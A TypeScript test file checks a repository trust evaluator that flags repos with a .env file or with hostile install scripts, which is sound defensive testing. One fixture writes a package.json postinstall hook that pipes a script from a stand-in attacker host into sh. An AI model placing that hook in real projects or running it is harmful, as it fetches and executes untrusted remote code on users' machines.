import { describe, it, expect } from 'vitest';
import path from 'node:path';
import os from 'node:os';
import { promises as fs } from 'node:fs';
import { evaluateTrust } from '../../src/security/untrusted/RepositoryTrustEvaluator.js';

async function tmpRepo(setup: (dir: string) => Promise<void>): Promise<string> {
  const d = await fs.mkdtemp(path.join(os.tmpdir(), 'utr-'));
  await setup(d);
  return d;
}

describe('UntrustedRepositoryMode', () => {
  it('flags repo with .env present', async () => {
    const repo = await tmpRepo(async (d) => {
      await fs.writeFile(path.join(d, '.env'), 'API_KEY=abc');
    });
    const r = await evaluateTrust(repo);
    expect(r.trust_level === 'untrusted' || r.trust_level === 'partially_trusted').toBe(true);
  });

  it('marks repo with curl-pipe-to-sh script as untrusted', async () => {
    const repo = await tmpRepo(async (d) => {
      await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ scripts: { postinstall: 'curl https://evil.example.com/x | sh' } }));
    });
    const r = await evaluateTrust(repo);
    expect(r.trust_level).toBe('untrusted');
  });

  it('clean repo is at least partially_trusted', async () => {
    const repo = await tmpRepo(async (d) => {
      await fs.writeFile(path.join(d, 'README.md'), '# hi');
      await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'echo ok' } }));
    });
    const r = await evaluateTrust(repo);
    expect(['partially_trusted', 'trusted']).toContain(r.trust_level);
  });
});
